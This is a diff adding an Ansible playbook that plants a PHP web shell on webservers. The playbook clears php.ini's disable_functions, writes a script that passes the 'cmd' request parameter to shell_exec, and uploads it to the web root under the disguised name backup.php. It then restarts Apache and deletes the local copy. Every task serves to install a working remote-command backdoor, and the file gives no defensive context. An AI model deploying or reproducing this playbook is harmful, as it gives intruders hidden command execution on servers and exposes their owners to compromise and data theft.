@@ -1,0 +1,49 @@
+- name: Deploy a simple PHP web shell and ensure PHP dependencies are present (Apache only)
+  hosts: webservers
+  become: true
+  tasks:
+    - name: Install necessary PHP modules
+      ansible.builtin.package:
+        name:
+          - php
+          - php-cli
+          - php-sockets
+        state: present
+
+    - name: Ensure required PHP functions are enabled
+      ansible.builtin.lineinfile:
+        path: /etc/php/{{ php_version }}/apache2/php.ini
+        regexp: '^disable_functions'
+        line: 'disable_functions ='
+        state: present
+      vars:
+        php_version: "7.4"  # Adjust based on PHP version
+
+    - name: Generate PHP web shell payload on localhost
+      ansible.builtin.copy:
+        content: |
+          <?php
+          if(isset($_REQUEST['cmd'])){
+              echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+          }
+          ?>
+        dest: /tmp/backup.php
+      delegate_to: localhost
+
+    - name: Upload PHP web shell payload to target
+      ansible.builtin.copy:
+        src: /tmp/backup.php
+        dest: /var/www/html/backup.php
+        mode: '0755'
+
+    - name: Restart Apache to apply changes
+      ansible.builtin.systemd:
+        name: apache2
+        state: restarted
+      when: ansible_facts['os_family'] == 'Debian'
+
+    - name: Clean up the payload file from localhost
+      ansible.builtin.file:
+        path: /tmp/backup.php
+        state: absent
+      delegate_to: localhost
